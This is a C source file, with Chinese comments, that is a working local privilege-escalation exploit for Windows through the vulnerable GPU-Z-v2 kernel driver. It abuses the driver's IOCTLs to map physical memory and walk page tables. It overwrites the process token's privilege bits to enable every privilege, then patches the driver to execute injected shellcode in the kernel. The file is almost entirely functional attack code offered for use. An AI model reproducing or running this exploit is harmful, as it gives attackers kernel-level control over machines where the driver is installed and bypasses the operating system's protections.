#include <stdio.h>
#include <tchar.h>
#include <malloc.h>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

#define DEV_NAME_V2 _T("\\\\.\\GPU-Z-v2")

//参数为 _MAP_INFO,返回8字节地址
#define IOCTL_MAP_PHYSICAL		0x80006430+0x2C
//参数为 映射的地址
#define IOCTL_UNMAP_PHYSICAL	0x80006430+0x30
//Hook 功能
#define IOCTL_EXECUTE_CODE		0x80006430+0x70

#pragma pack(push)
#pragma pack(1)
typedef struct _MAP_INFO {
	UINT64 MapAddr;
	UINT32 MapSize;
}MAP_INFO, * PMAP_INFO;
typedef struct _PAG {
	UINT64 IsEnable : 1;
	UINT64 Unused : 6;
	UINT64 BigPage : 1;
	UINT64 Unused2 : 4;
	UINT64 Base : 36;
	UINT64 Unknown : 16;
}PAG, * PPAG;

typedef struct _CALL_RAX {
	BYTE MovCode[2];
	UINT64 Address;
	BYTE CallCode[2];
	BYTE Nop[2];
}CALL_RAX, * PCALL_RAX;
#pragma pack(pop)

static PVOID MapPhyAddrToVirtual(UINT64 PhysicalAddress);
static PVOID MapKernelAddressToUserSpace(UINT64 VirtualAddress);
static BOOLEAN IsWindows10();
static VOID GetVirtualMap(UINT64 VirtualAddress, PUINT64 PML4T, PUINT64 PDPT, PUINT64 PDT, PUINT64 PT, PUINT64 Offset);
static UINT64 GetDriverLoadedAddress(LPSTR DriverName);
static BOOLEAN AdjustProcessToken(DWORD Pid);
static BOOLEAN ExecuteKernelCode(PBYTE Codes, UINT64 CodeSize);
static VOID UnmapPhysicalAddress(PVOID Addr);

HANDLE g_hFile;
BYTE ShellCode[] = { 0x48,0xb8,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0x0F,0x20,0x03,0x48,0x89,0x18,0xC3 };
CALL_RAX CallRax;
int main()
{
	CallRax.MovCode[0] = 0x48;
	CallRax.MovCode[1] = 0xB8;
	CallRax.CallCode[0] = 0xFF;
	CallRax.CallCode[1] = 0xD0;
	memset(CallRax.Nop, 0x90, sizeof(CallRax.Nop));

	g_hFile = CreateFile(DEV_NAME_V2, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_DEVICE, NULL);
	if (g_hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-]打开设备失败%x\n", GetLastError());
		return 0;
	}
	printf("--- 当前权限 ---\n");
	system("whoami /priv");
	if(!AdjustProcessToken(GetCurrentProcessId()))
	{
		printf("[-]提升权限失败,可能的错误:%d\n", GetLastError());
		return 0;
	}
	printf("[+]提升成功!\n");
	printf("--- 当前权限 ---\n");
	system("whoami /priv");

	printf("[*]写入ShellCode\n");
	UINT64 RetData = 0;
	*(PUINT64)(ShellCode + 2) = (UINT64)&RetData;
	ExecuteKernelCode(ShellCode, sizeof(ShellCode));
	if (RetData == 0)
		printf("[-]执行失败!\n");
	else
	{
		printf("[+]执行成功！\n");
		printf("[+]CR0 = %I64x\n", RetData);
	}
	CloseHandle(g_hFile);
	return 0;
}

BOOLEAN ExecuteKernelCode(PBYTE Codes, UINT64 CodeSize)
{
	//UINT64 DrvPocAddr = DrvAddr + 0x236B;
	//UINT64 DrvHookAddr = DrvAddr + 0x2600;
	if (CodeSize > 0x400) // 不能跨页 0x600 Offset
		return FALSE;

	UINT64 DrvAddr = GetDriverLoadedAddress("GPU-Z-v2.sys");
	if (!DrvAddr)
	{
		printf("[-]无法找到驱动内核地址!\n");
		return FALSE;
	}

	UINT64 DrvHookAddr = DrvAddr + 0x236B;
	UINT64 DrvHookOffset = DrvHookAddr & 0xfffULL;

	UINT64 DrvPocAddr = DrvAddr + 0x2600;
	UINT64 DrvPocBase   = DrvPocAddr & (~0xfffULL);
	UINT64 DrvPocOffset = DrvPocAddr & 0xfffULL;

	DebugBreak();
	UINT64 User32 = (UINT64)MapKernelAddressToUserSpace(DrvPocBase);

	memcpy((void*)(User32 + DrvPocOffset), ShellCode, sizeof(ShellCode));
	CallRax.Address = DrvPocAddr;
	memcpy((void*)(User32 + DrvHookOffset), &CallRax, sizeof(CallRax));

	UnmapPhysicalAddress((PVOID)User32);
	DWORD dwRetSize;
	DeviceIoControl(g_hFile, IOCTL_EXECUTE_CODE, NULL, 0, NULL, 0, &dwRetSize, NULL);
	return TRUE;
}

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

BOOLEAN AdjustProcessToken(DWORD Pid)
{
	PSYSTEM_HANDLE_INFORMATION HandleInfo = NULL;
	ULONG NeedSize = 0;

	HANDLE hProcess;
	HANDLE hToken = NULL;
	PUBLIC_OBJECT_TYPE_INFORMATION ObjectTypeInfo;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid);

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		return FALSE;

	CloseHandle(hProcess);
	PVOID ObjectPtr = NULL;
	do {
		NtQuerySystemInformation(16, &ObjectTypeInfo, sizeof(ObjectTypeInfo), &NeedSize);
		if (!NeedSize)
			break;

		NeedSize += 0x1000;
		HandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(NeedSize);
		if (!HandleInfo)
			break;

		if (!NT_SUCCESS(NtQuerySystemInformation(16, HandleInfo, NeedSize, &NeedSize)))
			break;

		for (ULONG Count = 0; Count < HandleInfo->NumberOfHandles; ++Count)
		{
			if (
				HandleInfo->Handles[Count].UniqueProcessId == Pid &&
				HandleInfo->Handles[Count].HandleValue == (USHORT)hToken
				)
			{
				ObjectPtr = HandleInfo->Handles[Count].Object;
				break;
			}
		}
	} while (FALSE);
	if (HandleInfo)
		free(HandleInfo);

	if (!ObjectPtr)
	{
		printf("[-]未找到TOKEN内核地址!\n");
		CloseHandle(hToken);
		return FALSE;
	}
	printf("[+]TokenObject : %p\n", ObjectPtr);

	UINT64 PageBase = ((UINT64)ObjectPtr + 0x040) & (~0xfffULL);
	UINT64 PageOffset = ((UINT64)ObjectPtr + 0x040) & 0xfff;

	UINT64 UserBase = (UINT64)MapKernelAddressToUserSpace(PageBase);
	if (!UserBase)
	{
		printf("[-]映射物理地址至用户空间失败!\n");
		CloseHandle(hToken);
		return FALSE;
	}

	PUINT64 PrivAttr = (PUINT64)(UserBase + PageOffset);// Write to 0000000f`f2ffffbc From PTOKEN+0x040 Len 0x18
	PrivAttr[0] = 0x0000000ff2ffffbc;
	PrivAttr[1] = 0x0000000ff2ffffbc;
	PrivAttr[2] = 0x0000000ff2ffffbc;
	UnmapPhysicalAddress((PVOID)UserBase);
	CloseHandle(hToken);
	return TRUE;
}

PVOID MapPhyAddrToVirtual(UINT64 PhysicalAddress)
{
	DWORD ReturnedSize = 0;
	MAP_INFO MapInfo;
	MapInfo.MapAddr = PhysicalAddress;
	MapInfo.MapSize = 0x1000;
	UINT64 OutAddr = 0;
	DeviceIoControl(g_hFile, IOCTL_MAP_PHYSICAL, &MapInfo, sizeof(MapInfo), &OutAddr, 0x8, &ReturnedSize, NULL);
	if (!ReturnedSize)
		return NULL;

	return (PVOID)OutAddr;
}

VOID UnmapPhysicalAddress(PVOID Addr)
{
	DWORD ReturnedSize = 0;
	DeviceIoControl(g_hFile, IOCTL_UNMAP_PHYSICAL, &Addr, sizeof(Addr), NULL, 0x0, &ReturnedSize, NULL);
}

PVOID MapKernelAddressToUserSpace(UINT64 VirtualAddress)
{
	UINT64 Addr;
	UINT64 PageTableAddr;
	UINT64 PML4T, PDPT, PDT, PT, Offset;

	if (IsWindows10())
		PageTableAddr = 0x1ad000;
	else
		PageTableAddr = 0x187000;

	GetVirtualMap(VirtualAddress, &PML4T, &PDPT, &PDT, &PT, &Offset);

	PPAG Data = (PPAG)MapPhyAddrToVirtual(PageTableAddr);
	if (!Data[PML4T].IsEnable)
		return NULL;

	//if (Data[PML4T].SupperPage)
	//{
	//	Addr = (Data[PML4T].Base << 12) + VirtualAddress & 0x7FFFFFFFFF;
	//	UnmapPhysicalAddress(Data);
	//	return MapPhyAddrToVirtual(Addr);
	//}
	Addr = Data[PML4T].Base << 12;
	UnmapPhysicalAddress(Data);

	Data = (PPAG)MapPhyAddrToVirtual(Addr);
	if (!Data[PDPT].IsEnable)
		return NULL;

	if (Data[PDPT].BigPage)
	{
		Addr = (Data[PDPT].Base << 12) + VirtualAddress & 0x3FFFFFFF;
		UnmapPhysicalAddress(Data);
		return MapPhyAddrToVirtual(Addr);
	}
	Addr = Data[PDPT].Base << 12;
	UnmapPhysicalAddress(Data);

	Data = (PPAG)MapPhyAddrToVirtual(Addr);
	if (!Data[PDT].IsEnable)
		return NULL;

	if (Data[PDT].BigPage)
	{
		Addr = (Data[PDT].Base << 12) + VirtualAddress & 0x1FFFFF;
		UnmapPhysicalAddress(Data);
		return MapPhyAddrToVirtual(Addr);
	}
	Addr = Data[PDT].Base << 12;
	UnmapPhysicalAddress(Data);

	Data = (PPAG)MapPhyAddrToVirtual(Addr);
	Addr = (Data[PT].Base << 12) + Offset;
	UnmapPhysicalAddress(Data);

	return MapPhyAddrToVirtual(Addr);
}

VOID GetVirtualMap(UINT64 VirtualAddress, PUINT64 PML4T, PUINT64 PDPT, PUINT64 PDT, PUINT64 PT, PUINT64 Offset)
{
	*Offset = VirtualAddress & 0xfff;
	*PT = (VirtualAddress >> 12) & ((1 << 0x9) - 1);
	*PDT = (VirtualAddress >> 12 >> 9) & ((1 << 0x9) - 1);
	*PDPT = (VirtualAddress >> 12 >> 9 >> 9) & ((1 << 0x9) - 1);
	*PML4T = (VirtualAddress >> 12 >> 9 >> 9 >> 9) & ((1 << 0x9) - 1);
}

typedef LONG(__stdcall* LPFN_RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
BOOLEAN IsWindows10()
{
	RTL_OSVERSIONINFOW OsVersionInfo;
	HMODULE hNtdll = LoadLibrary(_T("ntdll.dll"));
	if (!hNtdll)
		return FALSE;

	LPFN_RtlGetVersion RtlGetVersion = (LPFN_RtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
	if (!RtlGetVersion)
		return FALSE;

	OsVersionInfo.dwOSVersionInfoSize = sizeof(OsVersionInfo);
	RtlGetVersion(&OsVersionInfo);
	FreeLibrary(hNtdll);
	return OsVersionInfo.dwMajorVersion == 10;
}
#pragma pack(push)
#pragma pack(1)
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
	BYTE Unused[0x14];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	char ImageName[252];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
#pragma pack(pop)
UINT64 GetDriverLoadedAddress(LPSTR DriverName)
{
	ULONG NeedSize = 0;
	NtQuerySystemInformation(11, NULL, 0, &NeedSize);
	PSYSTEM_MODULE_INFORMATION FullModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(NeedSize);
	if (!FullModuleInfo)
		return 0;

	if (!NT_SUCCESS(NtQuerySystemInformation(11, FullModuleInfo, NeedSize, &NeedSize)))
		return 0;

	for (DWORD Count = 0; Count < FullModuleInfo->Count; ++Count)
	{
		char* Name;
		Name = strrchr(FullModuleInfo->Module[Count].ImageName, '\\');
		if (!Name)
			Name = FullModuleInfo->Module[Count].ImageName;

		if (!_stricmp(Name + 1, DriverName))
		{
			UINT64 DrvAddr = (UINT64)FullModuleInfo->Module[Count].Base;
			free(FullModuleInfo);
			return DrvAddr;
		}
	}
	free(FullModuleInfo);
	return 0;
}